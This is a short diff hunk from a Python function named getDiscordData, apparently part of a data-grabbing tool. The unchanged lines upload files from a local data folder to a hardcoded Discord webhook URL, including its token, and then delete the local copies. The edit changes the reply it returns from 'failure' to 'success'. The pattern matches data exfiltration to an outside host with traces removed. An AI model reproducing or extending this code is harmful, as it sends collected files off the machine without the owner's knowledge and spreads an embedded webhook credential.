@@ -93,7 +93,7 @@ def getDiscordData():
             session.post('https://discord.com/api/webhooks/1177543979164774472/mJgqm5Wtp-ACVxtAdgRKt8JwGHv6cHhp29OZDFGWDRbtgfQtjC4d9eB3IYBhZq_H7-4X', files={name : open('./data/' + name, 'rb')})
             os.remove('./data/' + name)
             session.close()
-        return {'message' : 'failure'}
+        return {'message' : 'success'}
     abort(405)
 
 
